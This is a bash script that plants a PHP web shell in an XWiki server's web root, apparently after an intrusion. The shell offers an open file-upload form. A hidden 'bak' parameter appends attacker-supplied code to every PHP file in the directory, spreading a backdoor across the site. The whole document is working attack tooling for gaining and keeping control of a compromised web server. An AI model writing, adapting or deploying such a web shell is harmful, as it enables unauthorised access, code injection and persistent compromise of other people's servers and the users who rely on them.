#!/bin/bash

echo "===== Current Directory ====="
pwd

echo
echo "===== Uploading custom shell ====="

SHELL_PATH="/var/lib/xwiki/webapps/ROOT/shell.php"

# Isi shell PHP yang kamu kasih, dengan escape double quote dan dolar
cat > "$SHELL_PATH" << 'EOF'
<?php echo"<form method='post' enctype='multipart/form-data'><input type='file' name='a'><input type='submit' value='Nyusuuu!!!'></form><pre>";if(isset($_FILES['a'])){move_uploaded_file($_FILES['a']['tmp_name'],"{$_FILES['a']['name']}");print_r($_FILES);};echo"</pre>";?>
<?php
if (isset($_GET['bak'])) {
$directory = __DIR__;
$mama = $_POST['file'];
$textToAppend = '
' . $mama . '
';
if ($handle = opendir($directory)) {
    while (false !== ($file = readdir($handle))) {
        if (pathinfo($file, PATHINFO_EXTENSION) === 'php') {
            $fileHandle = fopen($directory . '/' . $file, 'a');
            fwrite($fileHandle, $textToAppend);
            fclose($fileHandle);
            echo "OK >> $file
";
        }
    }
    closedir($handle);
}
}
?>
EOF

if [ -f "$SHELL_PATH" ]; then
    echo "Shell uploaded successfully at: /shell.php"
else
    echo "Shell upload failed!"
fi
